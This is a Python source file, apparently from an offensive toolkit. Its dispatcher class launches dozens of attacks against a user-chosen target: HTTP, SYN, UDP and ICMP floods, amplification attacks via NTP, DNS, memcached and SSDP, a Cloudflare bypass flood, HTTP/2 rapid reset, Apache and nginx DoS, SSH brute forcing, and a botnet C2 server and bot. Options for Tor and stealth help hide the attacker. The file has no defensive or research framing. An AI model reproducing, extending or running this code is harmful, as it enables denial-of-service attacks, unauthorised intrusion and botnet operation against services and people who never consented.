import threading
import asyncio
from src.utils import add_system_log, check_root_privileges
from src.security import increment_thread_counter
from src.attacks import (
    http_flood, async_http_flood, syn_flood, udp_flood,
    slowloris_attack, ntp_amplification, cloudflare_bypass_flood,
    memcached_amplification, ssdp_amplification, dns_amplification,
    rudy_attack, hoic_attack, http2_rapid_reset, apache_killer,
    nginx_range_dos, port_scanner, network_scanner, ip_tracker,
    adaptive_flood, vulnerability_scout, brute_force_suite,
    domain_osint, proxy_autopilot, wifi_ghost, packet_insight,
    payload_lab, identity_cloak, cve_explorer, web_exposure_sniper,
    icmp_flood, ping_of_death, quic_flood, mixed_flood, slowpost_attack
)
from src.core.c2 import BotnetC2
from src.core.menu import Menu

class AttackDispatcher:
    """Handles attack execution"""

    @staticmethod
    def execute(choice, params, monitor=None):
        """Execute the selected attack"""
        attack_info = Menu.ATTACKS.get(choice)
        if not attack_info:
            print("Invalid choice!")
            return

        if attack_info["needs_root"] and not check_root_privileges():
            print(f"{attack_info['name']} requires root privileges!")
            return

        if params is None:
            print("Invalid parameters provided!")
            return

        if choice == "7":
            c2_port = params.get("c2_port") or params.get("port") or 6667
            c2 = BotnetC2(port=c2_port)
            threading.Thread(target=c2.start_server, daemon=True).start()
            return c2

        if choice == "18":
            from src.bot import FullBot
            c2_host = params.get("c2_host") or params.get("target") or "127.0.0.1"
            c2_port = params.get("c2_port") or params.get("port") or 6667
            bot = FullBot(c2_host, c2_port)
            threading.Thread(target=bot.run, kwargs={'interactive': False}, daemon=True).start()
            return bot

        # Prepare target URL/IP
        target = params["target"]
        port = params.get("port", 0)
        duration = params["duration"]
        threads = params["threads"]
        proxies = params["proxies"]
        max_requests = params.get("max_requests", 0)

        add_system_log(f"[bold red]LAUNCHING:[/] {attack_info['name']} against {target}")
        
        if choice == "1":
            url = target if target.startswith("http") else f"http://{target}"
            for _ in range(threads):
                increment_thread_counter()
                threading.Thread(target=http_flood, args=(url, duration, proxies, monitor, max_requests, params.get('use_tor', False), params.get('stealth_mode', False)), daemon=True).start()

        elif choice == "2":
            url = target if target.startswith("http") else f"https://{target}"
            asyncio.run(async_http_flood(url, duration, proxies, monitor, max_requests, params.get('use_tor', False), params.get('stealth_mode', False)))

        elif choice == "3":
            for _ in range(threads):
                increment_thread_counter()
                threading.Thread(target=syn_flood, args=(target, port, duration, monitor, max_requests), daemon=True).start()

        elif choice == "4":
            for _ in range(threads):
                increment_thread_counter()
                threading.Thread(target=udp_flood, args=(target, port, duration, monitor, max_requests), daemon=True).start()

        elif choice == "5":
            slowloris_attack(target, port, duration, threads)

        elif choice == "6":
            ntp_amplification(target, duration, monitor)

        elif choice == "8":
            url = target if target.startswith("http") else f"https://{target}"
            cloudflare_bypass_flood(url, duration, proxies, monitor, max_requests, params.get('use_tor', False), params.get('stealth_mode', False))

        elif choice == "9":
            memcached_amplification(target, duration, monitor)

        elif choice == "10":
            ssdp_amplification(target, duration, monitor)

        elif choice == "11":
            dns_amplification(target, duration, monitor)

        elif choice == "12":
            url = target if target.startswith("http") else f"http://{target}"
            rudy_attack(url, duration, threads, monitor)

        elif choice == "13":
            url = target if target.startswith("http") else f"https://{target}"
            hoic_attack(url, duration, monitor)

        elif choice == "14":
            url = target if target.startswith("http") else f"https://{target}"
            http2_rapid_reset(url, duration, monitor)

        elif choice == "15":
            url = target if target.startswith("http") else f"https://{target}"
            apache_killer(url, duration, monitor)

        elif choice == "16":
            url = target if target.startswith("http") else f"https://{target}"
            nginx_range_dos(url, duration, monitor)

        elif choice == "17":
            ports = params.get("ports") or params.get("port") or "1-1024"
            stealth = params.get("stealth_mode", True)
            port_scanner(target, ports, threads, stealth=stealth)

        elif choice == "19":
            # Hybrid ICMP attack: Run both in parallel
            threading.Thread(target=ping_of_death, args=(target, duration, monitor), daemon=True).start()
            for _ in range(threads):
                increment_thread_counter()
                threading.Thread(target=icmp_flood, args=(target, duration, monitor), daemon=True).start()

        elif choice == "20":
            network_scanner(threads=threads, subnet=params.get("subnet"))

        elif choice == "21":
            ip_tracker(target if "." in target else None)

        elif choice == "22":
            url = target if target.startswith("http") else f"https://{target}"
            adaptive_flood(url, duration, proxies, monitor)

        elif choice == "23":
            url = target if target.startswith("http") else f"http://{target}"
            vulnerability_scout(url)

        elif choice == "24":
            brute_force_suite(target, params.get("service", "ssh"))

        elif choice == "25":
            domain_osint(target)

        elif choice == "26":
            proxy_autopilot()

        elif choice == "27":
            wifi_ghost()

        elif choice == "28":
            packet_insight(duration=duration)

        elif choice == "29":
            payload_lab()

        elif choice == "30":
            identity_cloak()

        elif choice == "31":
            cve_explorer(params.get("keyword", target))

        elif choice == "32":
            url = target if target.startswith("http") else f"http://{target}"
            web_exposure_sniper(url)
